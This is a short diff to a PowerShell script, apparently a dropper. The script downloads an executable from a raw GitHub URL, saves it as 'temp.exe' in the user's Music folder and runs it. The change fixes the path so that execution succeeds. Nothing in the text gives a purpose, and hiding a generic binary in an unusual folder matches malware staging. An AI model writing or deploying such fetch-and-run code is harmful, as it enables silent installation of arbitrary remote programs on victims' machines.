@@ -2,4 +2,4 @@ $dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/179_61_197
 $dlPath = Join-Path -Path $env:USERPROFILE -ChildPath "Music\temp.exe"
 Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
 cd $env:USERPROFILE
-.Music\temp.exe
+.\Music\temp.exe
